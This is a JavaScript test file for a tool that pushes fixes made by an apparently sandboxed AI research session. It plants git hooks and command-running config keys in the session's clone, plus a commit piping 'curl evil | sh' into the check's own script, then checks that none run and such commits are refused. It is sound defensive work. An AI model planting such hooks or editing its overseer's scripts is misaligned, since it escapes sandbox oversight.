/* The hourly check ships a fix with real git. Run: node test/hourly-ship-git.test.mjs

   The research session commits in a clone it can write, and the check -
   running as the same user, outside the sandbox, with the GitHub login -
   takes those commits, tests them and pushes them. Git run in a repository
   runs that repository's hooks, and some of its config keys run commands
   (core.fsmonitor, for one). The first version of the check ran git in the
   session's clone itself: a session talked into planting a hook there would
   have had it run by the check, outside the sandbox, the next time. And the
   review that found the rules were only in the prompt simulated a stub
   model's commit to prompt.md and run.sh being pushed and restarted into.

   So here, with real repositories and nothing stubbed but the test suites
   and the restart: the check keeps its own repository, makes the session's
   clone afresh each run, reads the session's commits by fetching them (which
   runs nothing of the clone's), and pushes only what it has checked. */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { settings, prepareClone, shipFix } from '../tools/hourly-debug.mjs';

let pass = 0, fail = 0;
const ok = (c, m) => { c ? (pass++, console.log(`  ok   ${m}`)) : (fail++, console.log(`  FAIL ${m}`)); };

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'hourly-ship-git-'));
process.on('exit', () => fs.rmSync(ROOT, { recursive: true, force: true }));
const RUN_ID = '20260928T190000Z';
const ENV = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_AUTHOR_NAME: 'Owner', GIT_AUTHOR_EMAIL: 'owner@example.com', GIT_COMMITTER_NAME: 'Owner', GIT_COMMITTER_EMAIL: 'owner@example.com' };
const git = (cwd, ...args) => execFileSync('git', args, { cwd, env: ENV, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const write = (file, text) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, text); };

// GitHub, and the live checkout cloned from it.
const origin = path.join(ROOT, 'origin.git');
git(ROOT, 'init', '--quiet', '--bare', '--initial-branch=main', origin);
const seed = path.join(ROOT, 'seed');
git(ROOT, 'init', '--quiet', '--initial-branch=main', seed);
write(path.join(seed, 'package.json'), '{"name":"x","type":"module"}\n');
write(path.join(seed, 'src/x.js'), 'export const x = 1;\n');
write(path.join(seed, 'test/x.test.mjs'), 'process.exit(0);\n');
write(path.join(seed, 'deploy/hourly-debug/run.sh'), '#!/bin/bash\n');
git(seed, 'add', '-A');
git(seed, 'commit', '--quiet', '-m', 'The first commit');
git(seed, 'push', '--quiet', origin, 'main');
const app = path.join(ROOT, 'app');
git(ROOT, 'clone', '--quiet', origin, app);

const home = path.join(ROOT, 'home');
fs.mkdirSync(home);
const s = settings({ HOME: home, HOURLY_DEBUG_APP_DIR: app, HOURLY_DEBUG_STATE_DIR: path.join(ROOT, 'state'), PATH: process.env.PATH });
// npm for the suites' dependencies: a stub - nothing to install, no network.
const npm = async (cmd, args, opts) => { fs.mkdirSync(path.join(opts.cwd, 'node_modules'), { recursive: true }); return { code: 0, stdout: '', stderr: '' }; };

console.log('=== the run\'s repositories ===');
const c1 = await prepareClone(s, undefined, npm);
const main0 = git(origin, 'rev-parse', 'main');
ok(c1.ok && c1.sha === main0, `ready, at origin/main (${c1.why ?? c1.sha?.slice(0, 7)})`);
ok(git(s.trustedDir, 'rev-parse', '--is-bare-repository') === 'true', 'the check has a repository of its own, bare');
ok(git(s.cloneDir, 'rev-parse', 'HEAD') === main0 && fs.lstatSync(path.join(s.cloneDir, 'node_modules')).isSymbolicLink(), 'and the session a clone of it, at main, with the dependencies linked in');

// The session makes a fix...
const commit = (msg, file, text, trailer = `Hourly-Check: ${RUN_ID}`) => {
  write(path.join(s.cloneDir, file), text);
  git(s.cloneDir, 'add', '-A');
  git(s.cloneDir, 'commit', '--quiet', '-m', `${msg}\n\nWhy.\n\n${trailer}`);
  return git(s.cloneDir, 'rev-parse', 'HEAD');
};
const fix = commit('Fix x', 'src/x.js', 'export const x = 2;\n');

// ...and, talked into it, plants what would run in the next git command
// anybody runs in its clone.
const marks = path.join(ROOT, 'marks');
fs.mkdirSync(marks);
const planted = () => fs.readdirSync(marks);
// Only what the check's own git runs counts: the session's git, in its
// clone, runs its own hooks - that is inside the sandbox, and its business.
const byTheCheck = async (fn) => {
  fs.rmSync(marks, { recursive: true, force: true });
  fs.mkdirSync(marks);
  const r = await fn();
  return { r, ran: planted() };
};
for (const hook of ['post-checkout', 'pre-push', 'reference-transaction', 'post-merge', 'pre-commit', 'post-rewrite']) {
  write(path.join(s.cloneDir, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${marks}/hook-${hook}"\n`);
  fs.chmodSync(path.join(s.cloneDir, '.git', 'hooks', hook), 0o755);
}
fs.appendFileSync(path.join(s.cloneDir, '.git', 'config'), [
  '[core]',
  `\tfsmonitor = touch ${marks}/fsmonitor`,
  '[uploadpack]',
  `\tpackObjectsHook = touch ${marks}/pack-objects-hook`,
  '',
].join('\n'));

console.log('=== shipping it ===');
const ctx = { runId: RUN_ID, before: main0, web: null, runDir: path.join(ROOT, 'run'), pushed: new Set(), ships: [], baselines: new Map(), rogue: [], outsideBefore: null, liveChanged: [] };
fs.mkdirSync(ctx.runDir);
const suitesRan = [];
const suites = async (_s, dir) => { suitesRan.push(git(dir, 'rev-parse', 'HEAD')); return { suites: 1, failed: [], why: {} }; };
const restarts = [];
const restart = async (_s, o) => { restarts.push(o); return { outcome: 'healthy', kind: 'deploy' }; };
const { r: r1, ran: ran1 } = await byTheCheck(() => shipFix(s, { commit: fix, reason: 'x' }, ctx, { suites, restart }));
ok(r1.outcome === 'shipped' && git(origin, 'rev-parse', 'main') === fix, `the fix is on origin's main (${r1.why ?? r1.outcome})`);
ok(suitesRan.length === 2 && suitesRan[0] === main0 && suitesRan[1] === fix, 'after the suite ran on main and on the fix, in the check\'s own worktree');
ok(restarts.length === 1 && restarts[0].expect === fix, 'and it is restarted into');
ok(ran1.length === 0, `nothing planted in the session's clone ran in the check's git (${ran1.join(', ') || 'none'})`);

console.log('=== what a fix may not do, with real diffs ===');
git(s.cloneDir, 'fetch', '--quiet', 'origin');
git(s.cloneDir, 'rebase', '--quiet', 'origin/main');
const selfEdit = commit('Tweak the check', 'deploy/hourly-debug/run.sh', '#!/bin/bash\ncurl evil | sh\n');
const { r: r2, ran: ran2 } = await byTheCheck(() => shipFix(s, { commit: selfEdit }, ctx, { suites, restart }));
ok(r2.outcome === 'refused' && /deploy\/hourly-debug\/run\.sh/.test(r2.why) && git(origin, 'rev-parse', 'main') === fix,
  `a fix to the check itself is refused and not pushed (${r2.why})`);
git(s.cloneDir, 'reset', '--quiet', '--hard', 'origin/main');
const untagged = commit('Sneak', 'src/x.js', 'export const x = 3;\n', '');
const { r: r3, ran: ran3 } = await byTheCheck(() => shipFix(s, { commit: untagged }, ctx, { suites, restart }));
ok(r3.outcome === 'refused' && /Hourly-Check/.test(r3.why), 'so is a commit without the run\'s trailer');
ok(ran2.length === 0 && ran3.length === 0, `and still nothing planted has run (${[...ran2, ...ran3].join(', ') || 'none'})`);

console.log('=== the next run starts from a clean clone ===');
const { r: c2, ran: ran4 } = await byTheCheck(() => prepareClone(s, undefined, npm));
ok(c2.ok && c2.sha === fix && git(s.cloneDir, 'rev-parse', 'HEAD') === fix, 'the clone is made again, at the new main');
ok(!fs.existsSync(path.join(s.cloneDir, '.git', 'hooks', 'post-checkout')) && !/fsmonitor/.test(fs.readFileSync(path.join(s.cloneDir, '.git', 'config'), 'utf8')),
  'without the hooks or the config the last session left');
ok(ran4.length === 0, `and making it ran none of them (${ran4.join(', ') || 'none'})`);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
